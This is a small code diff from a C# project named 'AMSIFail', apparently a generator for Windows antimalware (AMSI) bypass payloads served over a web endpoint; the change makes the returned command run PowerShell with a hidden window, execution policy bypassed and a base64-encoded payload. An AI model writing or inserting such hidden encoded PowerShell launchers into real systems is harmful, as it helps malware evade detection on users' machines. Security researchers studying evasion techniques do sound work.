@@ -40,7 +40,7 @@ namespace AMSIFail
             string responseMessage = "";
             try
             {
-                responseMessage = "powershell.exe -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Generator.GetPayload()));
+                responseMessage = "powershell.exe -w hidden -exec bypass -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Generator.GetPayload()));
                 return new OkObjectResult(responseMessage);
             }
             catch
